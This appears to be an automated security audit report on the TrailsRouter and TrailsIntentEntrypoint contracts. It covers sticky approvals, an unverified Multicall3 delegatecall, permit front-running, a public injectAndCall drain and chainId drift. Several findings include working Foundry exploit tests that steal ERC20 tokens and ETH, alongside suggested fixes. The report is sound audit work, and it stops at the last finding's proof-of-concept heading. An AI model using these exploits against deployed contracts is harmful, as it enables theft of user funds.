# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = false; and gpt-5
3 Valid UNIQUES

NICHE_PATTERN_ANALYSIS_MODE = true;

 **Derived From** : Sticky ERC20 allowances let called target drain user/router funds after call

[H-1]. Sticky approvals in TrailsRouter._injectAndExecuteCall let arbitrary target drain user wallet balances (delegatecall path)
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Delegatecall to external Multicall3 without codehash check can hijack execution

[H-2]. Router pullAmountAndExecute() delegatecalls unverified 0xcA11, enabling theft of ERC20s pulled into the router
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: On most major networks 0xcA11 is already deployed with the canonical bytecode, which reduces practical likelihood. However, the code does not restrict supported chains nor verify bytecode, so the vulnerability is real on networks where 0xcA11 is missing or attacker-controlled. Given this external-environment dependency, confidence is somewhat reduced.
Finding Complexity: 3
Privilege: Permissionless 
DUP?



 **Derived From** : Permit signature can be mempool front‑run, griefing depositWithPermit

[L-3]. Front‑running ERC‑2612 permit bricks TrailsIntentEntrypoint.depositToIntentWithPermit via nonce consumption
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : injectAndCall lacks onlyDelegatecall, lets anyone drain router-held ETH/ERC20

[H-4]. Public injectAndCall lets anyone drain TrailsRouter-held ETH or ERC20 via arbitrary call/approval (auth bypass)
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
DUP?


 **Derived From** : If IERC20(token).balanceOf(address(this)) was 0 before call, it remains 0 after call (all pulled tokens are consumed by target)

[H-5]. Public injectAndCall allows anyone to drain ERC20 leftovers left by injectSweepAndCall
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
DUP?


 **Derived From** : Immutable DOMAIN_SEPARATOR causes chainId/domain drift and signature failures on fork

[L-6]. ChainId drift bricks signature verification in TrailsIntentEntrypoint._verifyAndMarkIntent, DoS for deposits
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Cached EIP‑712 DOMAIN_SEPARATOR can break on chainId changes (domain drift)

[M-7]. ChainId drift DoS: cached DOMAIN_SEPARATOR + dynamic chainid() in TrailsIntentEntrypoint invalidates all signed intents after L2 chainId update
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 1
- L: 2
- I: 0

##Findings by Pattern


 **Derived From** : Sticky ERC20 allowances let called target drain user/router funds after call

## [H-1]. Sticky approvals in TrailsRouter._injectAndExecuteCall let arbitrary target drain user wallet balances (delegatecall path)

### Finding Severity Justification: In delegatecall context, _injectAndExecuteCall uses SafeERC20.forceApprove to grant the target an allowance from the caller wallet equal to the wallet’s entire token balance and never revokes it. This leaves a persistent approval from the user’s wallet to an arbitrary target, enabling that target to later transferFrom and drain current or future balances without further user authorization. This is direct asset theft risk with a clear, realistic attack path.
## Derived From Pattern/Invariant
Sticky ERC20 allowances let called target drain user/router funds after call

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter._injectAndExecuteCall grants ERC20 allowance to an arbitrary target via SafeERC20.forceApprove(erc20, target, callerBalance) and never revokes it. When used through injectAndCall under delegatecall (Sequence wallet context), the approval is set from the wallet (address(this) == wallet) to target for the wallet’s entire token balance. Because approval persists after the call, the target can later call token.transferFrom(wallet, ...) at any time to siphon current or future wallet balances up to the approved amount, without any further user authorization.

Vulnerable snippet:

function _injectAndExecuteCall(address token, address target, bytes memory callData, uint256 amountOffset, bytes32 placeholder, uint256 callerBalance) internal {
  ...
  if (token != address(0)) {
    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);
    (bool success, bytes memory result) = target.call(callData);
    ... // no approval reset
  }
}


## Impact
Attacker-controlled target retains spending rights and can unilaterally drain the user’s wallet ERC20s (present and future, up to approved amount) after the router call completes; results in direct token theft.

## Command to Run Test


## Proof of Concept
1) Victim wallet holds tokens T.
2) Victim runs a balance injection call (injectAndCall) to a target that is actually attacker-controlled (or any untrusted integration) — router forceApprove grants target allowance from the wallet for the full balance.
3) After the call returns, target retains allowance. Attacker later calls token.transferFrom(wallet, attacker, amount) from the target contract, draining the wallet without any further authorization.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract AttackTarget {
    // Accept the router call so _injectAndExecuteCall succeeds
    fallback() external payable {}
    // Use the sticky approval later to drain funds from the wallet
    function drain(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract WalletHarness {
    // Simulate a Sequence-like wallet delegatecalling the router
    function delegateInjectAndCall(address router, address token, address target) external {
        (bool ok, bytes memory ret) = router.delegatecall(
            abi.encodeWithSelector(TrailsRouter.injectAndCall.selector, token, target, bytes(""), 0, bytes32(0))
        );
        require(ok, string(ret));
    }
}

contract StickyApprovalDelegatecallTest is Test {
    TrailsRouter router;
    MockERC20 token;
    AttackTarget attacker;
    WalletHarness wallet;

    address attackerEOA = address(0xA11CE);
    address relayer = address(0x1234);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        attacker = new AttackTarget();
        wallet = new WalletHarness();
        vm.deal(attackerEOA, 10 ether);
        vm.deal(relayer, 10 ether);
    }

    function test_DrainWalletViaStickyApproval() public {
        // Wallet holds tokens
        token.mint(address(wallet), 1_000e18);
        uint256 beforeWallet = token.balanceOf(address(wallet));

        // Victim flow: router is delegatecalled by the wallet to attacker-controlled target
        vm.prank(relayer);
        wallet.delegateInjectAndCall(address(router), address(token), address(attacker));

        // Attacker later drains without any additional approval from wallet
        vm.prank(attackerEOA);
        attacker.drain(address(token), address(wallet), attackerEOA, 800e18);

        assertEq(token.balanceOf(address(wallet)), beforeWallet - 800e18);
        assertEq(token.balanceOf(attackerEOA), 800e18);
    }
}


## Suggested Mitigation
- Always revoke or minimize approvals after use. For example, after target.call, reset allowance back to 0 (or the previous value) using SafeERC20.forceApprove(erc20, target, 0).
- Prefer a Pull pattern within the same call context, or approve exact amounts and immediately reset to 0 regardless of success/failure paths (use try/catch or finally-like pattern).
- Consider approving a trusted helper (router/shim) and having it perform the transfer on behalf of targets instead of approving arbitrary targets.





 **Derived From** : Delegatecall to external Multicall3 without codehash check can hijack execution

## [H-2]. Router pullAmountAndExecute() delegatecalls unverified 0xcA11, enabling theft of ERC20s pulled into the router

### Finding Severity Justification: pullAmountAndExecute (and also execute/pullAndExecute) delegatecalls to a hardcoded external address (0xcA11… Multicall3) without verifying codehash/bytecode. The function first pulls user ERC20s into the router, then executes arbitrary code in the router’s context if the address is compromised. A malicious contract at 0xcA11 can transfer the freshly pulled tokens out of the router, resulting in direct, irreversible user asset loss.
## Derived From Pattern/Invariant
Delegatecall to external Multicall3 without codehash check can hijack execution

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: On most major networks 0xcA11 is already deployed with the canonical bytecode, which reduces practical likelihood. However, the code does not restrict supported chains nor verify bytecode, so the vulnerability is real on networks where 0xcA11 is missing or attacker-controlled. Given this external-environment dependency, confidence is somewhat reduced.
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
pullAmountAndExecute() first pulls tokens from msg.sender into the router, then delegatecalls to a hardcoded 0xcA11… Multicall3 without codehash verification. A malicious contract at 0xcA11 is executed in the router’s context and can immediately transfer those freshly pulled tokens to the attacker, ignoring aggregate3Value semantics and allowFailure=false checks. Vulnerable snippet:

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data) public payable returns (...) {
  _validateRouterCall(data);
  if (token == address(0)) { ... } else { _safeTransferFrom(token, msg.sender, address(this), amount); }
  (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
  if (!success) revert TargetCallFailed(returnData);
  return abi.decode(returnData, (IMulticall3.Result[]));
}

Because delegatecall runs attacker code as the router, any ERC20 balance on the router can be stolen by calling token.transfer(attacker, balance).

## Impact
Any assets that sit in TrailsRouter at the time of the delegatecall can be stolen if 0xCA11… does not contain the canonical Multicall3 bytecode. In pullAmountAndExecute and pullAndExecute, the router first moves funds (ERC20 or ETH) from the caller to itself, then delegatecalls 0xCA11. A malicious contract at 0xCA11 executes in the router’s context and can transfer the freshly pulled ERC20 or drain ETH to an attacker. The execute() function is also affected if the router already holds balances (e.g., dust or prior transfers). Loss is direct and unrecoverable.

## Command to Run Test


## Proof of Concept
Attack outline:
1) Attacker ensures that the address 0xcA11… on the target chain does not host the canonical Multicall3 (e.g., uninitialized chain or compromised deployment) and instead points to attacker-controlled code.
2) Victim approves TrailsRouter for a token and calls pullAmountAndExecute(token, amount, data) (or pullAndExecute), with data encoded as Multicall3.aggregate3Value so _validateRouterCall passes.
3) The router pulls amount tokens (or receives ETH) into itself, then delegatecalls 0xCA11.
4) The attacker’s logic, running as the router (delegatecall), transfers the ERC20/ETH balance from the router to the attacker and returns fabricated Result[].
5) The victim’s call succeeds and funds are gone.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "M") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MaliciousMulticall is IMulticall3 {
    address private immutable attacker;
    constructor(address _attacker) { attacker = _attacker; }

    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData) {
        // Drain the router's balance of the first "target" interpreted as an ERC20 (maliciously ignores Multicall3 semantics)
        if (calls.length > 0 && calls[0].target != address(0)) {
            IERC20 token = IERC20(calls[0].target);
            uint256 bal = token.balanceOf(address(this));
            if (bal > 0) {
                require(token.transfer(attacker, bal), "transfer fail");
            }
        }
        // Return fabricated successes so the router does not revert
        returnData = new Result[](calls.length);
        for (uint256 i; i < calls.length; i++) returnData[i] = Result(true, "");
    }

    function aggregate3(Call3[] calldata) external payable returns (Result[] memory) { revert("unused"); }
}

contract UntrustedDelegatecallErc20ExploitTest is Test {
    address constant MULTICALL = 0xcA11bde05977b3631167028862bE2a173976CA11;

    TrailsRouter router;
    MockERC20 token;
    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        // Deploy malicious code and write it to the 0xCA11... address
        MaliciousMulticall mal = new MaliciousMulticall(attacker);
        vm.etch(MULTICALL, address(mal).code);

        token.mint(victim, 1_000 ether);
        vm.prank(victim);
        token.approve(address(router), type(uint256).max);
    }

    function test_DrainERC20_viaPullAmountAndExecute() public {
        // Prepare aggregate3Value calldata that passes router validation
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({ target: address(token), allowFailure: false, value: 0, callData: ""});
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        uint256 beforeBal = token.balanceOf(attacker);
        vm.prank(victim);
        router.pullAmountAndExecute(address(token), 200 ether, data);

        assertEq(token.balanceOf(attacker), beforeBal + 200 ether, "attacker stole ERC20");
    }
}


## Suggested Mitigation
Do not delegatecall into an externally controlled address. Options:
- Inline Multicall3 aggregate3Value logic directly in TrailsRouter (or a linked internal library) so no external delegatecall is needed.
- If Multicall3 must be used via delegatecall, strictly verify its bytecode before every call: require(code.length > 0) and extcodehash(address) == EXPECTED_HASH (the canonical Multicall3 hash). Store the expected hash as an immutable constant per deployment. Revert on mismatch. This prevents execution if 0xCA11… is empty, proxied, or hosts non-canonical code.
Either approach fully eliminates the ability for an attacker to hijack execution via 0xCA11.





 **Derived From** : Permit signature can be mempool front‑run, griefing depositWithPermit

## [L-3]. Front‑running ERC‑2612 permit bricks TrailsIntentEntrypoint.depositToIntentWithPermit via nonce consumption

### Finding Severity Justification: Issue is a mempool-griefing DoS against depositToIntentWithPermit by pre-consuming the ERC-2612 permit nonce, causing the internal permit() call to revert. No funds are lost or stolen, and the user can immediately re-submit via depositToIntent (non-permit) using the already-set allowance from the front-run permit. Impact is limited to wasted gas and a retry, not asset loss.
## Derived From Pattern/Invariant
Permit signature can be mempool front‑run, griefing depositWithPermit

## Exploit Type
SignatureReplay

## Location
TrailsIntentEntrypoint.depositToIntentWithPermit

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
depositToIntentWithPermit accepts raw EIP‑2612 (v,r,s) in calldata and calls token.permit(...) before performing transfers. Because the signature is visible in the mempool, an attacker can front‑run by submitting the same permit first, consuming the token’s permit nonce. When the victim’s tx executes, IERC20Permit(token).permit(...) reverts due to nonce mismatch, reverting the whole deposit. This is a permissionless DoS/grief: no funds are stolen (allowance is set to this contract), but the user’s deposit fails and they must retry without permit or re‑sign a new permit.
Vulnerable snippet:
    IERC20Permit(token).permit(user, address(this), permitAmount, deadline, permitV, permitR, permitS);
    IERC20(token).safeTransferFrom(user, intentAddress, amount);
There is no guard to skip permit when allowance is already set, nor a strategy to tolerate prior consumption of the same permit.

## Impact
Denial‑of‑service on user deposits with permit, forcing retries/re‑signing and incurring extra gas; attacker can indefinitely grief by repeatedly consuming the permit nonce

## Command to Run Test


## Proof of Concept
1) User signs an ERC‑712 Trails intent and an ERC‑2612 permit authorizing TrailsIntentEntrypoint as spender for amount+fee.
2) Victim submits depositToIntentWithPermit with the permit (v,r,s) in calldata.
3) Attacker observes mempool, calls token.permit(user, entrypoint, value, deadline, v,r,s) first, consuming the ERC‑2612 nonce.
4) Victim’s tx executes _verifyAndMarkIntent(...), then calls token.permit(...) which now reverts (nonce mismatch). Entire deposit reverts. Allowance remains set but no deposit occurred.
5) Attacker can repeat this griefing for every re‑signed permit, causing repeated DoS until the user falls back to depositToIntent (without permit) or uses a private tx.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsIntentEntrypoint} from "src/TrailsIntentEntrypoint.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract MockERC20Permit is ERC20, ERC20Permit {
    constructor(string memory n, string memory s) ERC20(n, s) ERC20Permit(n) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract PermitFrontRunTest is Test {
    TrailsIntentEntrypoint entry;
    MockERC20Permit token;

    uint256 userPk;
    address user;
    address attacker;
    address relayer;
    address intent;

    function setUp() public {
        entry = new TrailsIntentEntrypoint();
        token = new MockERC20Permit("Mock", "MOCK");

        userPk = 0xBEEF;
        user = vm.addr(userPk);
        attacker = address(0xA11CE);
        relayer = address(0xB0B);
        intent = address(0x1111);

        token.mint(user, 1000 ether);
        vm.warp(1_700_000_000);
    }

    function signIntent(
        address _user,
        address _token,
        uint256 _amount,
        address _intentAddress,
        uint256 _deadline,
        uint256 _nonce,
        uint256 _feeAmount,
        address _feeCollector
    ) internal view returns (bytes32 digest) {
        bytes32 typehash = entry.TRAILS_INTENT_TYPEHASH();
        bytes32 intentHash = keccak256(
            abi.encode(
                typehash,
                _user,
                _token,
                _amount,
                _intentAddress,
                _deadline,
                block.chainid,
                _nonce,
                _feeAmount,
                _feeCollector
            )
        );
        digest = keccak256(abi.encodePacked("\x19\x01", entry.DOMAIN_SEPARATOR(), intentHash));
    }

    function signPermit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline
    ) internal view returns (bytes32 digest) {
        bytes32 permitTypehash = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
        uint256 nonce = token.nonces(owner);
        bytes32 structHash = keccak256(abi.encode(permitTypehash, owner, spender, value, nonce, deadline));
        digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
    }

    function test_FrontRunPermitCausesDepositRevert() public {
        uint256 amount = 100 ether;
        uint256 feeAmount = 0;
        uint256 permitAmount = amount + feeAmount;
        uint256 deadline = block.timestamp + 1 days;
        uint256 trailsNonce = entry.nonces(user); // 0

        // Sign Trails intent
        bytes32 intentDigest = signIntent(user, address(token), amount, intent, deadline, trailsNonce, feeAmount, address(0));
        (uint8 sigV, bytes32 sigR, bytes32 sigS) = vm.sign(userPk, intentDigest);

        // Sign ERC2612 permit for spender = entry
        bytes32 permitDigest = signPermit(user, address(entry), permitAmount, deadline);
        (uint8 permitV, bytes32 permitR, bytes32 permitS) = vm.sign(userPk, permitDigest);

        // Attacker front-runs by consuming the permit nonce
        vm.prank(attacker);
        token.permit(user, address(entry), permitAmount, deadline, permitV, permitR, permitS);

        // Victim tx now reverts on the internal permit call
        vm.expectRevert();
        vm.prank(relayer);
        entry.depositToIntentWithPermit(
            user,
            address(token),
            amount,
            permitAmount,
            intent,
            deadline,
            trailsNonce,
            feeAmount,
            address(0),
            permitV,
            permitR,
            permitS,
            sigV,
            sigR,
            sigS
        );

        // User can retry without permit, since allowance is already set
        assertEq(token.allowance(user, address(entry)), permitAmount);
        vm.prank(relayer);
        entry.depositToIntent(
            user,
            address(token),
            amount,
            intent,
            deadline,
            trailsNonce,
            feeAmount,
            address(0),
            sigV,
            sigR,
            sigS
        );

        assertEq(token.balanceOf(intent), amount);
        assertEq(entry.nonces(user), trailsNonce + 1);
        assertEq(entry.usedIntents(intentDigest), true);
    }
}


## Suggested Mitigation
Do not unconditionally call permit. First check allowance and skip permit if allowance >= permitAmount. Example:
    if (IERC20(token).allowance(user, address(this)) < permitAmount) {
        IERC20Permit(token).permit(user, address(this), permitAmount, deadline, permitV, permitR, permitS);
        require(IERC20(token).allowance(user, address(this)) >= permitAmount, "permit failed");
    }
Optionally, wrap the permit call in try/catch and proceed if allowance is already sufficient. Alternatively use Permit2 or pass the expected ERC‑2612 nonce and, if mismatched, skip permit when allowance is sufficient. These eliminate the mempool front‑run griefing.





 **Derived From** : injectAndCall lacks onlyDelegatecall, lets anyone drain router-held ETH/ERC20

## [H-4]. Public injectAndCall lets anyone drain TrailsRouter-held ETH or ERC20 via arbitrary call/approval (auth bypass)

### Finding Severity Justification: injectAndCall is publicly callable and not restricted by onlyDelegatecall, yet it operates on address(this) balances and can forward all ETH or set forceApprove and execute arbitrary calls for any ERC-20 held by the TrailsRouter. This enables any external account to drain any ETH or tokens held by the router (including leftovers from pullAmountAndExecute/pullAndExecute or accidental transfers). This is a direct asset theft path with no authentication, meeting High severity per C4 rubric.
## Derived From Pattern/Invariant
injectAndCall lacks onlyDelegatecall, lets anyone drain router-held ETH/ERC20

## Exploit Type
AuthByPass

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter.injectAndCall is documented for delegatecall context but is publicly callable and lacks onlyDelegatecall. It reads address(this) balance and forwards the entire amount to an attacker-chosen target, or force-approves an attacker-chosen target for the full ERC20 balance and then executes an arbitrary call. Any ETH sent to the router (receive() enabled) or ERC20 residuals left by pullAndExecute/pullAmountAndExecute can be stolen. Vulnerable snippets:

function injectAndCall(...) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) { ... }
    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}
...
if (token == address(0)) {
    (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
    ...
} else {
    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);
    (bool success, bytes memory result) = target.call(callData);
    ...
}

By contrast, sweeping functions enforce onlyDelegatecall.

## Impact
Any unprivileged EOA can steal all ETH and ERC20 balances held by the TrailsRouter, and set arbitrary approvals enabling further token drainage. This results in immediate monetary loss for any residual funds on the router.

## Command to Run Test


## Proof of Concept
1) Fund the router with ETH (receive()) and call injectAndCall(address(0), attacker, "", 0, 0) to forward the entire ETH balance to attacker.
2) Mint or leave ERC20 on the router. Call injectAndCall(token, token, abi.encodeWithSelector(IERC20.transfer.selector, attacker, balance), 0, 0) to transfer the full token balance to attacker. Alternatively set a malicious target to pull via transferFrom after forceApprove.

## Proof of Code
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract InjectAndCallBypassTest is Test {
    TrailsRouter router;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        vm.deal(attacker, 1 ether);
    }

    function test_DrainETH_via_injectAndCall() public {
        vm.deal(address(this), 100 ether);
        (bool ok,) = address(router).call{value: 10 ether}("");
        assertEq(ok, true);

        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        router.injectAndCall(address(0), attacker, "", 0, bytes32(0));

        assertEq(address(router).balance, 0);
        assertEq(attacker.balance, attackerBefore + 10 ether);
    }

    function test_DrainERC20_via_injectAndCall() public {
        MintableERC20 token = new MintableERC20();
        token.mint(address(router), 1_000e18);
        uint256 bal = token.balanceOf(address(router));

        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(token),
            abi.encodeWithSelector(IERC20.transfer.selector, attacker, bal),
            0,
            bytes32(0)
        );

        assertEq(token.balanceOf(address(router)), 0);
        assertEq(token.balanceOf(attacker), bal);
    }
}


## Suggested Mitigation
Restrict injectAndCall to delegatecall context by adding onlyDelegatecall (or remove the external entry and route exclusively via handleSequenceDelegateCall -> _injectAndCallDelegated). If a public variant is required, redesign it to use msg.sender funds (like injectSweepAndCall) rather than address(this), and avoid granting approvals to arbitrary targets.





 **Derived From** : If IERC20(token).balanceOf(address(this)) was 0 before call, it remains 0 after call (all pulled tokens are consumed by target)

## [H-5]. Public injectAndCall allows anyone to drain ERC20 leftovers left by injectSweepAndCall

### Finding Severity Justification: Leftover ERC20 balances pulled into the TrailsRouter by injectSweepAndCall can be arbitrarily approved and drained by any caller through the publicly callable injectAndCall. This enables direct theft of users’ tokens left on the router when the original target only partially spends the approved amount. There are no access controls, no approval revocation, and no refund of leftovers, so impact is direct loss of funds.
## Derived From Pattern/Invariant
If IERC20(token).balanceOf(address(this)) was 0 before call, it remains 0 after call (all pulled tokens are consumed by target)

## Exploit Type
AccountingInvariantViolation

## Location
TrailsRouter.injectSweepAndCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
injectSweepAndCall pulls the caller's full token balance into the TrailsRouter, approves `target` for that full amount, and calls `target`. If `target` only transferFroms a partial amount, the remainder stays on the router. Because injectAndCall is public and not delegatecall-gated, any EOA can later call it with an attacker-controlled `target` to forceApprove the router's entire ERC20 balance to that `target` and drain all remaining tokens via transferFrom. Vulnerable flow: (1) victim calls injectSweepAndCall with ERC20, (2) target pulls less than approved, leaving d > 0 on router, (3) attacker calls injectAndCall to set approval for attacker target and drain d. Key snippets: in injectSweepAndCall: `_safeTransferFrom(token, msg.sender, address(this), callerBalance);` then `_injectAndExecuteCall(...)`. In _injectAndExecuteCall (ERC20 branch): `SafeERC20.forceApprove(erc20, target, callerBalance); (bool success,) = target.call(callData);` No refund of leftovers or approval reset; injectAndCall is public and reuses router-held balance to re-approve any target.

## Impact
Any EOA can call injectAndCall to set approval of the router’s current ERC20 balance to an arbitrary target and drain any ERC20 tokens left on the router by prior injectSweepAndCall usage (or any ERC20 accidentally residing on the router). Additionally, if the router ever holds native ETH (e.g., excess msg.value during pullAndExecute/execute or accidental transfers), calling injectAndCall with token=address(0) will forward the entire ETH balance to an attacker-controlled target. Result: direct theft of ERC20 and potentially native ETH held by the router.

## Command to Run Test


## Proof of Concept
1) Victim has N tokens and calls injectSweepAndCall(token, target, ...) where target only transferFroms N - d from the router, leaving d on the router. 2) Attacker calls injectAndCall(token, attackerTarget, ...) which sets approval for the router's full token balance to attackerTarget and calls it. 3) attackerTarget calls transferFrom(router, attacker, d) to steal the leftovers. 4) Router token balance goes to 0; attacker gains d.

## Proof of Code
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract PartialPuller {
    // Pull only a partial amount from the router (msg.sender)
    function pull(address token, uint256 amountToPull, address receiver) external {
        IERC20(token).transferFrom(msg.sender, receiver, amountToPull);
    }
}

contract Drainer {
    // Drain entire router balance (msg.sender) to attacker
    function drain(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transferFrom(msg.sender, to, bal);
    }
}

contract TrailsRouter_InjectSweepAndCall_DrainLeftovers_Test is Test {
    TrailsRouter router;
    MockERC20 token;
    PartialPuller puller;
    Drainer drainer;

    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        puller = new PartialPuller();
        drainer = new Drainer();

        token.mint(victim, 1_000 ether);
        vm.prank(victim);
        token.approve(address(router), type(uint256).max);
    }

    function test_DrainLeftoverTokens() public {
        uint256 N = 1_000 ether;
        uint256 d = 123 ether; // leftover amount to be stolen
        uint256 amountToPull = N - d;

        // Victim calls injectSweepAndCall; target only pulls part (N - d)
        vm.prank(victim);
        router.injectSweepAndCall(
            address(token),
            address(puller),
            abi.encodeWithSelector(PartialPuller.pull.selector, address(token), amountToPull, address(puller)),
            0,
            bytes32(0)
        );

        // Router now holds d leftover tokens
        assertEq(token.balanceOf(address(router)), d, "router holds leftover d");

        // Attacker drains leftovers via public injectAndCall by approving drainer
        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(drainer),
            abi.encodeWithSelector(Drainer.drain.selector, address(token), attacker),
            0,
            bytes32(0)
        );

        // All leftovers stolen by attacker
        assertEq(token.balanceOf(address(router)), 0, "router drained to zero");
        assertEq(token.balanceOf(attacker), d, "attacker stole leftovers d");
    }
}


## Suggested Mitigation
1) Restrict injectAndCall to delegatecall-only (onlyDelegatecall) or remove the public/external entry point entirely and route all usage through handleSequenceDelegateCall -> _injectAndCallDelegated. 2) In the ERC20 branch of _injectAndExecuteCall, after the external call returns, revoke the approval with forceApprove(token, target, 0). 3) Ensure the router does not retain funds post-call: track preSelfBalance and postSelfBalance for the token/ETH and refund any increase (leftovers) to the appropriate recipient (msg.sender for injectSweepAndCall; the wallet for delegated paths). 4) For ETH paths (execute/pullAndExecute), consider validating that the sum of value fields matches msg.value or explicitly refund any unspent msg.value at the end of execution to prevent ETH from remaining on the router.





 **Derived From** : Immutable DOMAIN_SEPARATOR causes chainId/domain drift and signature failures on fork

## [L-6]. ChainId drift bricks signature verification in TrailsIntentEntrypoint._verifyAndMarkIntent, DoS for deposits

### Finding Severity Justification: Impact could brick deposit/fee flows, but only if the chainId changes (fork/migration). This is an external, rare event and not attacker-driven. Many production systems accept immutable domain separators with the known tradeoff of redeploy on chainId drift. Therefore, it’s a resilience/availability concern with low likelihood, not an asset loss vulnerability.
## Derived From Pattern/Invariant
Immutable DOMAIN_SEPARATOR causes chainId/domain drift and signature failures on fork

## Exploit Type
SignatureReplay

## Location
TrailsIntentEntrypoint._verifyAndMarkIntent

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsIntentEntrypoint caches the EIP-712 DOMAIN_SEPARATOR at deployment using block.chainid and address(this). In _verifyAndMarkIntent, the struct encodes the current chainid() while the digest uses the cached DOMAIN_SEPARATOR. If the network chainId changes (fork/migration), wallets will sign over the new domain (new chainId), but the contract verifies against the old domain, making valid new signatures unverifiable. This permanently breaks depositToIntent and depositToIntentWithPermit until redeploy. Vulnerable snippets:

constructor() {
    DOMAIN_SEPARATOR = keccak256(abi.encode(..., block.chainid, address(this)));
}
...
assembly {
    mstore(add(ptr, 0xc0), chainid()) // struct field uses current chain id
}
...
assembly {
    mstore(add(ptr, 0x20), _domainSeparator) // cached, immutable
}


## Impact
Functional DoS: All future deposits and fee payments revert after a chainId change; protocol deposit liveness halted until redeploy/migration.

## Command to Run Test


## Proof of Concept
